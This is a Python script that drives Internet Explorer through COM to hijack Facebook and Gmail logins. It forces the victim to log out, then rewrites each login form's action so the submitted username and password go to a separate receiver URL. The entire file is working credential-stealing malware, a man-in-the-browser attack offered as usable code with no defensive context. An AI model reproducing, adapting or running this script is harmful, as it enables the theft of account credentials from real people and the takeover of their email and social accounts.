import win32com.client
import time
import urlparse
import urllib

data_reciever = 'http://localhost:8080/'
LOGOUT_URL, LOGOUT_FORM, LOGIN_FORM_INDEX, OWNED = (
    'logout_url', 'logout_form', 'login_form_index', 'owned')
FACEBOOK, GOOGLE, GOOGLE2, GOOGLE3 = (
    'www.facebook.com',
    'accounts.google.com',
    'www.gmail.com',
    'mail.google.com'
)
CLSID = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
def get_target_sites():
    '''get the target site info'''
    target_sites = {}
    target_sites[FACEBOOK] = {
        LOGOUT_URL : None,
        LOGOUT_FORM : LOGOUT_FORM,
        LOGIN_FORM_INDEX : 0,
        OWNED : False
    }
    logout = 'https:/%s/Logout?hl=en&continue=https:/%s/' % (GOOGLE, GOOGLE)
    target_sites[GOOGLE] = {
        LOGOUT_URL : logout + 'ServiceLogin%3Fservice%3Dmail',
        LOGOUT_FORM : None,
        LOGIN_FORM_INDEX : 0,
        OWNED : False
    }
    # use the same site info for multiple google sites
    target_sites[GOOGLE2] = target_sites[GOOGLE]
    target_sites[GOOGLE3] = target_sites[GOOGLE]
    return target_sites
def get_windows(clsid):
    '''get window'''
    return win32com.client.Dispatch(clsid)
def browser_ready(browser):
    '''check if browser is ready'''
    return browser.ReadyState in [4, 'complete']
def wait_for_browser(browser):
    '''wait for browser to do it's thing'''
    while not browser_ready(browser):
        time.sleep(0.1)
    return
def main():
    '''main function'''
    target_sites = get_target_sites()
    windows = get_windows(CLSID)
    while True:
        # check if we own all sites
        all_owned = True
        for url in target_sites:
            site = target_sites[url]
            if not site[OWNED]:
                all_owned = False
                break
        if all_owned:
            break # quit when all OWNED

        for browser in windows:
            # current window's site
            url = urlparse.urlparse(browser.LocationURL)
            site = None
            # check if we own it
            if url.hostname in target_sites:
                site = target_sites[url.hostname]
                if site[OWNED]:
                    continue
            if site and site[LOGOUT_URL]:
                browser.Navigate(site[LOGOUT_URL])
                wait_for_browser(browser)
            else:
                # retrieve all elements in the document
                full_doc = browser.Document.all
                #iterate looking for the logoout form
                for i in full_doc:
                    try:
                        # find the logout form and submit it
                        if i.id == site[LOGOUT_FORM]:
                            i.submit()
                            wait_for_browser(browser)
                    except:
                        pass
                # now we modify the login form
                try:
                    login_index = site[LOGIN_FORM_INDEX]
                    login_page = urllib.quote(browser.LocationUrl)
                    login_form = browser.Document.forms[login_index]
                    login_form.action = '%s%s' % (data_reciever, login_page)
                    site[OWNED] = True
                except:
                    pass
            time.sleep(5)
main()